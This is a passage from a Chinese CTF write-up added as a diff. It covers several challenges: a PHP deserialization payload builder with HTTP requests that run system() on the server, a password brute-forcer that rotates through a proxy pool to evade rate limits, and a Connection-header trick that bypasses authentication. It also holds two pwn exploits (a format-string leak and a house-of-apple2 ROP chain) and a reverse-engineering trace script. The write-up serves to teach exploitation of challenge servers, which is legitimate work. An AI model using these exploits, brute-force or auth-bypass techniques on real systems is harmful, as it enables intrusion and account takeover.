+$line_number = 1;
+
+// $absolute_path = "/var/www/html/test.php";
+// $line_number = 59;
+
+
+$internal_func_name = "\0readflag" . $absolute_path . ":" . $line_number . "$1";
+//echo urlencode($internal_func_name) . "\n";
+
+$x = new test();
+$x->key = "class";
+$x->f = "test";
+$x->readflag = "" . brute();
+
+$y = new test();
+$y->key = "func";
+$y->f = $internal_func_name;
+$y->readflag = "";
+
+$z = new test();
+$z->key = "none";
+$z->f = $y;
+$z->readflag = $x;
+
+$payload = serialize($z);
+
+
+echo $payload . "\n";
+
+$payload = urlencode($payload);
+echo $payload . "\n";
+```
+
+构造的思路是，先 upload 然后 readflag
+
+upload 只能由 __construct 触发，所以 $x 这个实例是固定的，因为在执行 `new test()` 之前 `$GLOBALS['filename']` 的值会被 $this->readflag 这个成员变量覆盖，所以 $x 的 readflag 只能是爆破出的种子后缀
+
+![img](30.png)
+
+$y 的构造思路也很简单，就是使用 `\0` 开头的函数名直接执行位于第一行的函数 readflag，实现文件包含
+
+`class` 和 `func` 两个功能的调用都是依赖于 test 类的 __destruct，所以需要另外一个实例来调一下这两个的触发顺序，先反序列化的会后销毁，所以将 $y 放在 $x 前面，就能使得 $x 对应的 upload 先触发，$y 对应的 readflag 后触发，上传的时候就要触发
+
+```HTTP
+POST /index.php?land=O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A6%3A%22510868%22%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Ds%3A1%3A%22f%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A0%3A%22%22%3Bs%3A1%3A%22f%22%3Bs%3A55%3A%22%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22none%22%3B%7D&1=phpinfo(); HTTP/1.1
+Host: eci-2zec4wcd4d3ndjtuqk53.cloudeci1.ichunqiu.com:80
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMvFc5zDkBcoa1yiL
+Content-Length: 138
+
+------WebKitFormBoundaryMvFc5zDkBcoa1yiL
+Content-Disposition: form-data; name="file"; filename="119738"
+Content-Type: image/jpeg
+
+{{file:line(C:\Users\baozhongqi\Desktop\final.phar.gz)}}
+------WebKitFormBoundaryMvFc5zDkBcoa1yiL--
+```
+
+![img](31.png)
+
+读取 /flag 不成功，suid 提权即可
+
+```HTTP
+POST /index.php?land=O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A6%3A%22295468%22%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Ds%3A1%3A%22f%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A0%3A%22%22%3Bs%3A1%3A%22f%22%3Bs%3A55%3A%22%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22none%22%3B%7D&1=system("ls+%2F%3Bbase64+%27%2Fflag%27+%7C+base64+--decode"); HTTP/1.1
+Host: eci-2zebka9daam6xqviqyeq.cloudeci1.ichunqiu.com:80
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMvFc5zDkBcoa1yiL
+Content-Length: 138
+
+------WebKitFormBoundaryMvFc5zDkBcoa1yiL
+Content-Disposition: form-data; name="file"; filename="295468"
+Content-Type: image/jpeg
+
+{{file:line(C:\Users\baozhongqi\Desktop\final.phar.gz)}}
+------WebKitFormBoundaryMvFc5zDkBcoa1yiL--
+```
+
+![img](32.png)
+
+## anime
+
+每ip每秒限制5次登陆访问，题目提示5位数字的密码，可以上ip池爆破
+
+```Python
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from tqdm import tqdm
+
+with open('p.txt', 'r') as f:
+    psa = [x.strip().split(':') for x in f.readlines()]
+# print(psa)
+
+target_url = "http://47.105.120.74:1001/login"
+
+def filter_disabled_ips(psa):
+    result = []
+    for ps in tqdm(psa):
+        proxyMeta = "http://%(host)s:%(port)s" % {
+            "host": ps[0],
+            "port": ps[1],
+        }
+        proxies = {
+            "http": proxyMeta,
+            "https": proxyMeta
+        }
+        res = requests.get(target_url, proxies=proxies)
+        if res.status_code in [302, 200]:
+            result.append(ps)
+        else:
+            print(ps, res.status_code, res.text)
+    return result
+
+# psa = filter_disabled_ips(psa)
+# print(len(psa))
+
+def login(password):
+    username = "TTXSMcc"
+    ps = psa[int(password) % len(psa)]
+    proxyMeta = "http://%(host)s:%(port)s" % {
+        "host": ps[0],
+        "port": ps[1],
+    }
+    proxies = {
+        "http": proxyMeta,
+        "https": proxyMeta
+    }
+    data = {"username": username, "password": password}
+    res = requests.post(target_url, data=data, proxies=proxies, allow_redirects=False)
+
+    if res.status_code != 302:
+        with open('failed.txt', 'a') as f:
+            f.write(f"{password}\n")
+        # print(password, res.status_code, res.text)
+        return
+    if "/login" in res.text:
+        pass
+    else:
+        print(password, res.text)
+
+def run(tasks):
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        futures = [executor.submit(login, pas) for pas in tasks]
+        for _ in tqdm(as_completed(futures), total=len(futures)):
+            pass
+
+if __name__ == '__main__':
+    tasks = [f"{i:05d}" for i in range(100000)]
+    # tasks = [x.strip() for x in open('failed.txt', 'r').readlines()]
+    # open('failed.txt', 'w').write("")
+    run(tasks)
+```
+
+写wp的时候爆破出密码是18149（交flag的时候是89195）
+
+![img](33.png)
+
+登陆后编辑个人资料，没找到flag
+
+![img](34.png)
+
+注册的时候发现用户名大小写不敏感，尝试将用户名改成全小写，拿到flag（可能是缓存机制的问题？）
+
+![img](35.png)
+
+> flag{hhhu4ny1n6_q14n6w4n6_x14nf3n6}
+
+## SecretVault
+
+前端go代理会先删掉发送的 X-User，再自己设置一个新的 X-User。再把请求发往后端前，反向代理会按 Connection 头列出的令牌删同名头部。
+
+[RFC 7230 - Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing](https://datatracker.ietf.org/doc/html/rfc7230#section-6.1)
+
+```Go
+func main() {
+        authorizer := &httputil.ReverseProxy{Director: func(req *http.Request) {
+                req.URL.Scheme = "http"
+                req.URL.Host = "127.0.0.1:5000"
+
+                uid := GetUIDFromRequest(req)
+                log.Printf("Request UID: %s, URL: %s", uid, req.URL.String())
+                req.Header.Del("Authorization")
+                req.Header.Del("X-User")
+                req.Header.Del("X-Forwarded-For")
+                req.Header.Del("Cookie")
+
+                if uid == "" {
+                        req.Header.Set("X-User", "anonymous")
+                } else {
+                        req.Header.Set("X-User", uid)
+                }
+        }}
+```
+
+于是刚设置的 X-User 又被删掉，后端就完全收不到 X-User 了，直接默认设置了 `uid=0`
+
+应用代码如下
+
+```Python
+uid = request.headers.get('X-User', '0')
+print(uid)
+if uid == 'anonymous':
+    flash('Please sign in first.', 'warning')
+    return redirect(url_for('login'))
+try:
+    uid_int = int(uid)
+except (TypeError, ValueError):
+    flash('Invalid session. Please sign in again.', 'warning')
+    return redirect(url_for('login')
+```
+
+构造数据包不好构造，直接 curl
+
+```Bash
+printf 'GET /dashboard HTTP/1.1\r\nHost: 101.201.70.201:20509\r\nConnection: X-User\r\n\r\n' | nc 101.201.70.201 20509
+```
+
+![img](36.png)
+
+# Pwn
+
+## Flag-market
+
+有一个全局变量的溢出写，可以覆盖到format变量
+
+![img](37.png)
+
+![img](38.png)
+
+format变量在上面会用作printf参数，可以通过覆盖format字符串触发格式化字符串漏洞
+
+![img](39.png)
+
+通过泄露stream的地址，进而泄露IO_FILE结构体里buffer的地址，进而读出buffer中的数据，即flag
+
+![img](40.png)
+
+```Python
+from pwn import *
+from struct import pack
+from ctypes import *
+from bisect import *
+
+def s(a):
+    p.send(a)
+
+def sa(a, b):
+    p.sendafter(a, b)
+
+def sl(a):
+    p.sendline(a)
+
+def sla(a, b):
+    p.sendlineafter(a, b)
+
+def r():
+    p.recv()
+
+def pr():
+    print(p.recv())
+
+def rl(a):
+    return p.recvuntil(a)
+
+def inter():
+    p.interactive()
+
+def debug():
+    gdb.attach(p)
+
+#    pause()
+def get_addr():
+    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+
+def get_sb():
+    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
+
+context(os='linux', arch='amd64', log_level='debug')
+
+# p = process("./chall")
+p = remote(b"47.93.217.138", 34946)
+sla(b"welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit", str(1))
+sla(b"how much you want to pay?", str(-1))
+
+
+offset = 0x4041C0 - 0x4040C0
+payload = b"a" * offset + b"%9$p%12$s"
+sla(b"opened user.log, please report:", payload)
+
+addr_pay = p64(0x402010)
+
+sla(b"welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit", str(1))
+sla(b"how much you want to pay?", addr_pay)
+
+p.recvuntil(b"0x")
+addr = eval("0x" + p.recv(6).decode())
+offset = 0x480-0x2a0
+addr += offset
+
+success(hex(addr))
+
+addr_pay = addr
+
+take_my_money(p64(addr_pay))
+
+inter()
+```
+
+## bhp
+
+关键漏洞函数：
+
+![img](41.png)
+
+![img](42.png)
+
+sub_1640()中我们可以控制输入的长度带出把libc基地址，heap基地址，stack基地址，pie基地址任意选一个地址，我们选择带出libc基地址。
+
+sub_1810()函数中存在无限制的malloc，我们可以通过设置size为一个极大数来实现后面标记的地址任意写一个字节0。
+
+我们选择攻击_IO_2_1_stdin，详见https://blog.csdn.net/Mr_Fmnwon/article/details/144547328。
+
+在获得任意长度的地址任意写后我们选择劫持_IO_2_1_stderr 攻击 house of apple2。
+
+但是程序启用了沙盒。
+
+![img](43.png)
+
+我们可以找到一个magic_rop:
+
+```Plain
+╰─ ropper --file ./libc.so.6 --search "mov rdx, rax%"
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: mov rdx, rax%
+
+[INFO] File: ./libc.so.6
+0x0000000000130405: mov rdx, rax; call qword ptr [rbx + 0x28]; 
+...
+```
+
+再结合setcontext完成对rsp的修改实现栈迁移，然后为了方便就先拼一个read，然后再通过read再拼一个绕开沙盒的orw。
+
+exp：
+
+```Python
+from pwn import *
+#from ctypes import *
+
+def stre(a) : return str(a).encode()
+def ph(a,b="addr") : print(b+": "+hex(a))
+def re(a) : return p.recv(a)
+def pre(a) : print(p.recv(a))
+def reu(a,b=False) : return p.recvuntil(a,drop=b)
+def rel() : return p.recvline()
+def se(a) : p.send(a)
+def sea(a,b) : p.sendafter(a,b)
+def sel(a) : p.sendline(a)
+def sela(a,b) : p.sendlineafter(a,b)
+def op() : p.interactive()
+def cp() : p.close()
+def raddr64() : return u64(p.recv(6).ljust(8,b'\x00')) 
+def raddr32() : return u32(p.recv(4))
+def raddr_T() : return int(re(14),16)
+def raddr_A() : return int(reu(b"-",True),16)
+def orw_rop64(pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr):
+    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
+    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
+    orw+= p64(read_addr)
+    orw+= p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30)
+    orw+= p64(write_addr)
+    return orw
+def getorw(name,buf,Arch) :
+    sh=shellcraft.open(name)
+    sh+=shellcraft.read(3,buf,0x30)
+    sh+=shellcraft.write(1,buf,0x30)
+    sh=asm(sh,arch=Arch)
+    return sh
+def gdbp(p,a='') :
+    if a!='':
+        gdb.attach(p,a)
+        pause()
+    else :
+        gdb.attach(p)
+        pause()
+
+p = remote("8.147.135.168", 34818)
+#p = process("./pwn")
+#elf = ELF("./pwn")
+libc = ELF("./libc.so.6")
+#lib = cdll.LoadLibrary(None)
+
+#loadsym = "glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64"
+#code_addr = " ./glibc-2.41.tar.gz --force"
+
+#p = process(["qemu-mipsel-static","-g", "9999","-L","./","./pwn"])
+#p = process(["qemu-mipsel-static","-L","./","./pwn"])
+
+#context.log_level = 'debug'
+#context.arch = 'amd64'
+#context.os = 'linux'
+#elf.arch , elf.so
+
+def add(size, content):
+    sela(b"Choice: ", stre(1))
+    sela(b"Size: ", stre(size))
+    sea(b"Content: ", content)
+
+def dele(index):
+    sela(b"Choice: ", stre(4))
+    sela(b"Index: ", index)
+
+payload = b"A"*0x28
+#gdbp(p)
+sea(b": ", payload)
+reu(b"A"*0x28)
+#pie_addr = raddr64() -  0x2041
+#ph(pie_addr, "pie_addr")
+
+libc_base = raddr64() - 0xaddae
+ph(libc_base, "libc_base")
+io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
+sys_addr = libc_base + libc.sym['system']
+stderr = libc_base + 0x2044e0
+pop_rdi = libc_base + 0x10f78b
+pop_rsi = libc_base + 0x110a7d
+pop_rsi_r15 = libc_base + 0x10f789
+syscall = libc_base + 0x11C5A2
+pop_rax = libc_base + 0xdd237
+flag_addr = libc_base + 0x2045b0
+pop_rdx = libc_base + 0xab8a1
+pop_rcx = libc_base + 0xa877e
+
+sela(b"Choice: ", stre(1))
+#gdbp(p)
+sela(b"Size: ", stre(libc_base+0x203911+0x8))
+#gdbp(p)
+payload = b"A"*0x18 + p64(stderr-0x70) + p64(stderr+0xE0)
+sea(b"Content: ", payload)
+
+payload = b"\x00"
+sea(b"Choice: ", payload)
+
+payload = b"A"*0x10 + p64(0) + p64(pop_rsi_r15) + p64(stderr-0x38) + p64(0) + p64(syscall)
+payload = payload.ljust(0x40, b"\x00")
+payload+= p64(0) + p64(0)
+payload+= p64(stderr) + p64(0)
+payload+= p64(0)*2
+payload+= p32(0xfffff7f5) + b";sh\x00" + p64(0)
+payload+= p64(0)*2
+payload+= p64(0) + p64(libc_base+0x4A99D)
+payload+= b"\x00"*0x38 + p64(libc_base+0x130405) + b"\x00"*0x10 + p64(stderr) + p64(0x110) + b"\x00"*0x10 + p64(stderr-0x60) # payload头地址
+payload+= p64(pop_rdi) + b"\x00"*0x20 + p64(stderr) + p64(io_wfile_jumps)
+sea(b"Choice: ", payload)
+
+payload = b"\x00"
+sela(b"Choice: ", payload)
+
+sela(b"Choice: ", stre(6))
+
+sleep(0.1)
+payload = p64(pop_rdi) + p64(0xFFFFFFFFFFFFFF9C) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rcx) + p64(stderr-0x80)
+payload+=p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(257) + p64(syscall) + p64(pop_rdi) + p64(3) + p64(pop_rsi)
+payload+= p64(stderr-0x70) + p64(pop_rcx) + p64(stderr-0x80) + p64(pop_rdx) + p64(0x50) + p64(pop_rax) + p64(0)
+payload+= p64(syscall) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stderr-0x70) + p64(pop_rcx) + p64(stderr-0x80)
+payload+= p64(pop_rdx) + p64(0x50) + p64(pop_rax) + p64(1) + p64(syscall) + b"flag\x00\x00\x00\x00"
+se(payload)
+
+op()
+```
+
+Flag:
+
+![img](44.png)
+
+# Re
+
+## tradre
+
+也是脑洞大开，看不懂ptrace怎么搞的，在网上找到了个ptrace hook方案，利用strace把所有ptrace调用的时候的参数数据等全部打印了出来，整出了个超大的trace文件
+
+```Plain
+strace -e trace=ptrace -o ./trace.log ./tradre
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
+ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee620, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x7ffd83aee4c0, orig_rax=0xffffffffffffffff, rip=0x400afd, cs=0x33, eflags=0x246, rsp=0x7ffd83aee430, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_PEEKTEXT, 3936, 0x400afd, [0x858bccffffffffbf]) = 0
+ptrace(PTRACE_PEEKDATA, 3936, 0x400afc, [0x8bccffffffffbfcc]) = 0
+ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee620, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x7ffd83aee4c0, orig_rax=0xffffffffffffffff, rip=0x4018ce, cs=0x33, eflags=0x246, rsp=0x7ffd83aee428, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
+ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x404938, orig_rax=0xffffffffffffffff, rip=0x4018e2, cs=0x33, eflags=0x206, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_PEEKTEXT, 3936, 0x4018e2, [0xfe58858b48ccc990]) = 0
+ptrace(PTRACE_PEEKDATA, 3936, 0x4018e1, [0x58858b48ccc990cc]) = 0
+ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x401254) = 0
+ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x286, r10=0, r9=0x7f6c88f59740, r8=0xffffffff, rax=0x7ffd83aee4c0, rcx=0x7f6c8907805e, rdx=0, rsi=0, rdi=0x404938, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x206, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
+ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404980, orig_rax=0xffffffffffffffff, rip=0x40125c, cs=0x33, eflags=0x202, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_PEEKTEXT, 3936, 0x40125c, [0x55b60fe74588d831]) = 0
+ptrace(PTRACE_PEEKDATA, 3936, 0x40125b, [0xb60fe74588d831cc]) = 0
+ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x4012aa) = 0
+ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404980, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x202, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
+ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x4049c8, orig_rax=0xffffffffffffffff, rip=0x4012b2, cs=0x33, eflags=0x202, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_PEEKTEXT, 3936, 0x4012b2, [0x45c7cc00000001bf]) = 0
+ptrace(PTRACE_PEEKDATA, 3936, 0x4012b1, [0xc7cc00000001bfcc]) = 0
+ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x4012e7) = 0
+ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x4049c8, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x202, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=3936, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
+ptrace(PTRACE_GETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404a10, orig_rax=0xffffffffffffffff, rip=0x4012ef, cs=0x33, eflags=0x202, rsp=0x7ffd83aee400, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_PEEKTEXT, 3936, 0x4012ef, [0x8b48fffffe30958b]) = 0
+ptrace(PTRACE_PEEKDATA, 3936, 0x4012ee, [0x48fffffe30958bcc]) = 0
+ptrace(PTRACE_POKEDATA, 3936, 0x7ffd83aee3f8, 0x400e55) = 0
+ptrace(PTRACE_SETREGS, 3936, {r15=0x7f6c891c9040, r14=0, r13=0x4047cb, r12=0x7ffd83aee778, rbp=0x7ffd83aee420, rbx=0, r11=0x246, r10=0x77, r9=0x9212a0, r8=0x7f6c89178a70, rax=0x44, rcx=0x7f6c890708f7, rdx=0x1, rsi=0x1, rdi=0x404a10, orig_rax=0xffffffffffffffff, rip=0x400810, cs=0x33, eflags=0x202, rsp=0x7ffd83aee3f8, ss=0x2b, fs_base=0x7f6c88f59740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
+ptrace(PTRACE_CONT, 3936, NULL, 0)      = 0
+```
+
+通过观察前几行发现，每次中断后都会修改rip的值，从而实现了在碰到子进程一堆int 3干扰时能游刃有余的跑代码，所以一开始的思路就很明确，拿到整个汇编代码的trace记录。因此利用idapython和前面拿到的trace.log里的rip值对，实现了个反汇编指令trace，并保存到了文件进行分析
+
+```Python
+import re
+import idc
+import idaapi
+import ida_lines
+import ida_ua
+
+# --- 1. 确保 trace.log 文件在 IDA 可以访问的路径 ---
+try:
+    log_data = open("trace.log", "r").read()
+except IOError:
+    # 如果找不到日志文件，只在 IDA 控制台打印错误
+    print("错误：无法打开 trace.log。请确保它与 IDB/I64 文件在同一目录。")
+    raise Exception("Log file not found")
+
+# --- 2. 定义输出文件名 ---
+OUTPUT_FILENAME = "clean_asm_trace1.txt"
+
+# ---------------------------------------------------
+
+def get_disasm_line(ea):
+    """
+    获取指定地址处的反汇编指令行。
+    """
+    if ea == idaapi.BADADDR:
+        return None
+    
+    line = ida_lines.generate_disasm_line(ea, 0)
+    if not line:
+        line = idc.get_disasm(ea)
+        if not line:
+            return None
+    
+    # 清理 IDA 生成的颜色标签
+    cleaned_line = ida_lines.tag_remove(line)
+    return cleaned_line
+
+
+def write_clean_asm_path(start_ea, end_ea, file_handle):
+    """
+    从 start_ea 线性反汇编，并将纯指令写入文件，直到遇到
+    控制流指令或到达 end_ea。
+    """
+    if start_ea is None:
+        return
+        
+    ea = start_ea
+    
+    while True:
+        # 停止条件
+        if ea == idaapi.BADADDR or ea >= end_ea or ea < 0:
+            break
+            
+        disasm = get_disasm_line(ea)
+        if disasm:
+            # 只写入清理后的汇编指令
+            file_handle.write(f"{disasm}\n")
+        
+        mnem = ida_ua.print_insn_mnem(ea)
+            
+        # 遇到控制流指令则停止此线性路径
+        if mnem.startswith('j') or mnem == 'ret' or mnem == 'call':
+            break
+
+        # 移动到下一条指令
+        ea = idc.next_head(ea)
+
+
+def parse_and_write_trace(log_content, output_filename):
+    """
+    解析日志并按顺序将纯净的汇编指令路径写入文件。
+    """
+    segments = []
+    
+    # 正则表达式
+    get_regex = re.compile(r"PTRACE_GETREGS, \d+, .*rip=\s*(0x[0-9a-fA-F]+)")
+    set_regex = re.compile(r"PTRACE_SETREGS, \d+, .*rip=\s*(0x[0-9a-fA-F]+)")
+    poke_regex = re.compile(r"PTRACE_POKEDATA, \d+, 0x[0-9a-fA-F]+, (0x[0-9a-fA-F]+)\)")
+
+    current_get, current_set, current_poke = None, None, None
+
+    for line in log_content.splitlines():
+        get_match = get_regex.search(line)
+        set_match = set_regex.search(line)
+        poke_match = poke_regex.search(line)
+
+        if get_match:
+            if current_get is not None:
+                segments.append((current_get, current_set, current_poke))
+            current_poke = None # 为新段重置
+            
+            ea = int(get_match.group(1), 16)
+            current_get = ea if 0x4009F7 <= ea <= 0x401B82 else None
+
+        if poke_match and current_get is not None and current_poke is None:
+            current_poke = int(poke_match.group(1), 16)
+
+        if set_match and current_get is not None:
+            current_set = int(set_match.group(1), 16)
+            
+    if current_get is not None:
+        segments.append((current_get, current_set, current_poke))
+
+    if not segments:
+        print("未在日志中解析出任何有效的执行段。")
+        return
+
+    # 打开文件并写入纯净的汇编代码
+    with open(output_filename, "w", encoding="utf-8") as f_out:
+        for i in range(len(segments) - 1):
+            get_A, set_A, poke_A = segments[i]
+            get_B, _, _ = segments[i+1]
+            end_ea = get_B - 1
+
+            # 1. 写入蹦床代码 (通常是 ret)
+            write_clean_asm_path(set_A, end_ea, f_out)
+
+            # 2. 写入主逻辑路径 (VM '调用' 的地址)
+            write_clean_asm_path(poke_A, end_ea, f_out)
+
+    print(f"纯净的汇编跟踪已成功写入到: {OUTPUT_FILENAME}")
+
+# --- 运行脚本 ---
+parse_and_write_trace(log_data, OUTPUT_FILENAME)
+```
+
+可以发现代码量非常恐怖，展示一部分:
+
+```Java
+push    rbp
+mov     rbp, rsp
+sub     rsp, 20h
+mov     [rbp-18h], rdi
+lea     rdi, aOooooooooooooO; "ooooooooooooo                          "...
+jmp     cs:puts_ptr
+lea     rdi, a88888888888Y88; "8'   888   `8                         "...
+jmp     cs:puts_ptr
+lea     rdi, a888OoooD8bOooo; "     888      oooo d8b  .oooo.    .oooo"...
+jmp     cs:puts_ptr
+lea     rdi, a8888888pP88bD8; "     888      `888\"\"8P `P  )88b  d88'"...
+jmp     cs:puts_ptr
+lea     rdi, a888888Op888888; "     888       888      .oP\"888  888  "...
+jmp     cs:puts_ptr
+lea     rdi, a888888D8888888; "     888       888     d8(  888  888   "...
+jmp     cs:puts_ptr
+lea     rdi, aO888oD888bY888; "    o888o     d888b    `Y888\"\"8o `Y8b"...
+jmp     cs:puts_ptr
+mov     edi, 10000h
+jmp     cs:srand_ptr
+mov     dword ptr [rbp+var_8], 0
+cmp     dword ptr [rbp+var_8], 7
+mov     dword ptr [rbp-4], 0
+cmp     dword ptr [rbp-4], 1Fh
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+movsxd  rdx, eax
+lea     rax, byte_606020
+movzx   esi, byte ptr [rdx+rax]
+mov     eax, [rbp-4]
+movsxd  rdx, eax
+mov     rax, [rbp-18h]
+add     rax, rdx
+movzx   ecx, byte ptr [rax]
+mov     eax, [rbp-8]
+shl     eax, 5
+mov     edx, eax
+mov     eax, [rbp-4]
+add     eax, edx
+xor     ecx, esi
+movsxd  rdx, eax
+lea     rax, byte_606020
+mov     [rdx+rax], cl
